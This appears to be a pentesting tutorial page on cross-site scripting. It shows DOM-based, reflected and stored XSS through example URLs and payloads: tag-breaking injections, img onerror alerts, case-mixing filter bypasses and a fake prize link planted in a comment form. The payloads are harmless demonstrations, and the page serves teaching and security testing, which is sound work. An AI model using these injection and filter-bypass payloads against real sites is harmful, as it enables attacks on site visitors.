---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cross-Site Scripting

Also known as XSS scripting, it allows the execution of malicious code of JavaScript or any client-side language. We can find different types of XSS scripting:

## <mark style="color:blue;">DOM-based</mark>

The vulnerability is in the client-side code, where the browserâ€™s Document Object Model (DOM), the one handled by HTML, is manipulated to execute untrusted scripts.

We can find a typical example of this vulnerability as follows:

* The URL shows changes in a parameter

<pre class="language-html" data-title="Example Case" data-overflow="wrap" data-line-numbers><code class="lang-html">&#x3C;!-- We select language in a slider and is reflected on url -->
http://url/?language=en

&#x3C;!-- Check html of the page for script tags and document.write() functions-->
...
&#x3C;select name="default">
<strong>  &#x3C;script>
</strong><strong>  ...
</strong>    document.write("&#x3C;option value='"+lang+"'>"+decodeURI(lang) + "&#x3C;/option>");
  ...
  &#x3C;/script>
&#x3C;/select>
...

&#x3C;!-- Use '> to close the "value" parameter and then close tags -->
http://url/?default='>&#x3C;/option>&#x3C;/select>   
&#x3C;!-- We will see all options of the slider are now displayed on screen -->

<strong>&#x3C;!-- Then we can create any tag to insert HMTL code-->
</strong>http://url/?default='>&#x3C;/option>&#x3C;/select>&#x3C;h1>HACKED&#x3C;/h1>

&#x3C;!-- We can even abuse this to inject JS code -->
http://url/?default='>&#x3C;/option>&#x3C;/select>&#x3C;script>if(window.confirm('HACKED\nTRY TO CALL FOR HELP?')){window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');};&#x3C;/script>
</code></pre>

***

* In some cases, it will not work directly, so we can check the page code to see the conditions of the input

{% tabs %}
{% tab title="Case 1" %}
Sometimes the script tag will be filtered

{% code title="Example source code" %}
```php
...
if (stripos ($default, "<script") !== false) {
...
```
{% endcode %}

This could be bypassed using a `img` tag and then putting a bad `src` value which will cause an error. After that, we can handle it with the `onerror` parameter that lets us insert _JS_ Code

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?default='></option></select><img src=x onerror='alert("HACKED")'/>
```
{% endcode %}
{% endtab %}

{% tab title="Case 2" %}
Sometimes the input will be filtered with specific values

{% code title="Example source code" %}
```php
...
switch ($_GET['default']) { 
    case "French": 
    case "English":
...
```
{% endcode %}

This could be bypassed using any of these values at the start of the sentence, and then using a `&` to concatenate the payload of the injection

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/?default=English&'></option></select><script>alert("HACKED")</script>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:blue;">Reflected</mark>

The vulnerability occurs when the parameters inputted by the client, are displayed on the screen of the page when the site processes a request.

We can find typical examples of this vulnerability as follows:

* When a parameter is sent in a query of the URL or a formulary, and this value is shown on the page content

<pre class="language-bash" data-overflow="wrap" data-line-numbers data-full-width="false"><code class="lang-bash">#We do a petition and the site returns "Hello" in any part of the HTML
curl http://$url/?msg=$value 
# Then we could try to inject code
<strong>curl http://url/?msg=&#x3C;script>alert("HACKED")&#x3C;/script>
</strong>
#Or when we insert a value in a form and the site returns it in any part of the HTML, we could fill the form with code to inject
&#x3C;script>alert("HACKED")&#x3C;/script>
</code></pre>

***

* In some cases, it will not work directly, so we can check the page code to see the conditions of the input.

{% tabs %}
{% tab title="Case 1" %}
Sometimes the script tag will be filtered

{% code title="Example source code" %}
```php
...
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
...
```
{% endcode %}

This could be bypassed by using capital letters on the tag values or using other symbols to evade filtering

{% code overflow="wrap" lineNumbers="true" %}
```bash
<sCrIpT>alert("HACKED")</script>
<s|script>alert("HACKED")</script>
```
{% endcode %}
{% endtab %}

{% tab title="Case 2" %}
If that still doesn't work, we can use a `img` tag, and then put a bad `src` value which will cause an error. After that, we can handle it with the `onerror` parameter that lets us insert _JS_ Code

<pre class="language-bash"><code class="lang-bash"><strong>&#x3C;img src=x onerror='alert("HACKED")'/>
</strong></code></pre>
{% endtab %}
{% endtabs %}

## <mark style="color:blue;">Stored</mark>

The vulnerability occurs when the input of values is saved by the web and displayed to anyone who browses the site. In the same way, malicious code will remain globally on the website.

We can find a typical example of this vulnerability as follows:

* We find a list of entries, and we see a formulary that inputs fill those entries globally on the page

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
#We insert names and comments in the formulary.
#Then we could fill the form to inject malicious code and show it to any other user that browse the website
<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">CLICK HERE TO WIN A PRIZE</a>
```
{% endcode %}

{% hint style="info" %}
If we encounter a limitation on the length of the input, we can right-click the form space, go to _Inspect,_ and modify the `maxlength` value
{% endhint %}
